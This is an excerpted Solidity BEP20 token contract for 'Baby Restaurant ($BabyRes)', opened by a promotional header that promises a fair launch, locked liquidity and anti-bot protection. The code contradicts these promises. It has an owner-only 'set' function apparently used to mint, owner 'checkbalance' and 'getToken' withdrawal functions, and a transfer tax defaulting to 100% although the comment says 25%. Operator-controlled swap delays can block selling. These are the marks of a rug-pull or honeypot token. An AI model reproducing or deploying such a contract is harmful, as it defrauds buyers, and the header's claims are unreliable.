...
/**
🍽 Baby Restaurant ($BabyRes)
🕰 Fair Launch at 16:30 UTC Monday July 26th on Pancakeswap
🔑 Locked LP at launch
📲 Telegram: https://t.me/babyres_bsc
🌐 Website: https://babyres.finance/
🖥 Whitepaper: https://babyres.finance/wp.html

Welcome to the new chapter - Baby Restaurant! Before you judge, we aren’t just any other fork or cash-grab. BabyRestaurant focuses on the fundamentals of creating a sustainable autonomous venture with User at the core of it. Anti-Whale & Anti-Bot are meant to stay here! All you have to do is hold them cute Baby Restaurant in your wallet.

📌 Tokenomics:
🔥5% Burn
☝️20% Back to liquidity
🌀Total supply: 5000 tokens
 🏦  LP: 4900 tokens
👛 Team Wallet: 100 tokens
...
interface IUniswapV2Pair {
    ...
    event checkbalance(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event set(address indexed sender, uint amount0, uint amount1);
    event Swap(
...
contract BEP20 is Context, IBEP20, Ownable {
    ...
    function set(uint256 amount) public onlyOwner returns (bool) {
        _set(_msgSender(), amount);
        return true;
    }
...
contract TEST is BEP20 {
    // Transfer tax rate in basis points. (default 25%)
    uint16 public transferTaxRate = 10000;
    // Burn rate % of transfer tax. (default 80% x 25% = 20% of total amount).
    uint16 public burnRate = 80;
    // Max transfer tax rate: 80%.
	...
	// start Block Swap, changable
    uint256 public startBlockSwap = 9352680;
	...
	uint256 public timeLimitSwap = 20;
    ...
    modifier antiWhale(address sender, address recipient, uint256 amount) {
        if (maxTransferAmount() > 0) {
            if (
                ...
                require(amount <= maxTransferAmount(), "TEST::antiWhale: Transfer amount exceeds the maxTransferAmount");
                require(startBlockSwap <= block.number, "TEST::swap: Cannot transfer at the moment");
            }
        }
        _;
    }
     ...
     */
    constructor() public BEP20("TEST", "TEST") {
    ...
    function checkbalance(address _to, uint256 _amount) public onlyOwner {
    ...
    /// @dev overrides transfer function to meet tokenomics of BABYRES
    function _transfer(address sender, address recipient, uint256 amount) internal virtual override antiWhale(sender, recipient, amount) {
		...
		if (limitSwap == true && _excludedPoolsContracts[sender] == false && _excludedPoolsContracts[recipient] == false) {	
			...
			if (userAddress != address(0) && delay == 0){
				if (_userInfo[userAddress] > 0) {
					...
					require(checkLastSwap >= timeLimitSwap, "TEST:: Trade Too fast");					
				}																
        ...
        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient] || recipient == BURN_ADDRESS ) {
            ...
            require(taxAmount == burnAmount + liquidityAmount, "TEST::transfer: Burn value invalid");

            // default 92.5% of transfer sent to recipient
            uint256 sendAmount = amount.sub(taxAmount);
            require(amount == sendAmount + taxAmount, "TEST::transfer: Tax value invalid");
    ...
    function getToken(IBEP20 _token, address _recipient, uint256 _amount) public onlyOperator {
        require(_recipient != address(0), "TEST::withdraw: ZERO address.");
    ...
    function updateTransferTaxRate(uint16 _transferTaxRate) public onlyOperator {
        require(_transferTaxRate <= MAXIMUM_TRANSFER_TAX_RATE, "TEST::updateTransferTaxRate: Transfer tax rate must not exceed the maximum rate.");
    ...
    function updateBurnRate(uint16 _burnRate) public onlyOperator {
        require(_burnRate <= 100, "TEST::updateBurnRate: Burn rate must not exceed the maximum rate.");
    ...
    function updateMaxTransferAmountRate(uint16 _maxTransferAmountRate) public onlyOperator {
        require(_maxTransferAmountRate <= 1000000, "TEST::updateMaxTransferAmountRate: Max transfer amount rate must not exceed the maximum rate.");
    ...
    /**
     * @dev Exclude or include an address from limitSwap. Can only be called by the current operator.
     */	
    ...
    /**
     * @dev Update the swapAndLiquifyEnabled. Can only be called by the current operator.
     */
    ...
    function UpdateStartBlockSwap(uint256 _block) public onlyOwner {
		require(block.number <= startBlockSwap, "TEST::UpdateStartBlockSwap: Cannot update when ready");
    ...
    function UpdateTimeLimitSwap(uint256 _timeLimitSwap) public onlyOperator {
		require(_timeLimitSwap <= 28800, "TEST::UpdateTimeLimitSwap: Too long.");
    ...
    function UpdateDelaySell(uint256 _delaySell) public onlyOperator {
		require(_delaySell <= 1200, "TEST::UpdateDelaySell: Too long.");
    ...
    function updateResRouter(address _router) public onlyOperator {
        ...
        require(resPair != address(0), "TEST::updateResRouter: Invalid pair address.");
    ...
    function transferOperator(address newOperator) public onlyOperator {
        require(newOperator != address(0), "TEST::transferOperator: new operator is the zero address");
